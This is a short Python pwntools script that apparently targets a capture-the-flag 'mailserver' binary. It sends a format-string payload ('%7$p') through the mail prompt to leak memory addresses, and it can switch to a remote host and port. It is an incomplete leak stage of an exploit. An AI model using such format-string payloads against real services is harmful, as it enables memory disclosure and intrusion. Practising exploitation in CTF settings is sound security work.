from pwn import *

PROGNAME   = "./mailserver"
REMOTEIP   = "8.8.8.8"
REMOTEPORT = 9999

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf

# 22 for our string
def do_format_string(p, s):
    p.sendlineafter("mailto: ", "debug@geegle.org")
    p.sendlineafter("mailfrom: ", "BBBBBBBB")
    p.sendlineafter("mail: ", s)
    p.recvuntil("BBBBBBBB\n")
    return p.recvline()

PIE_LEAK = 0x4270
for i in range(1, 30):
    p = process(PROGNAME)
    print do_format_string(p, "%7$p")
    p.close()
p.interactive()

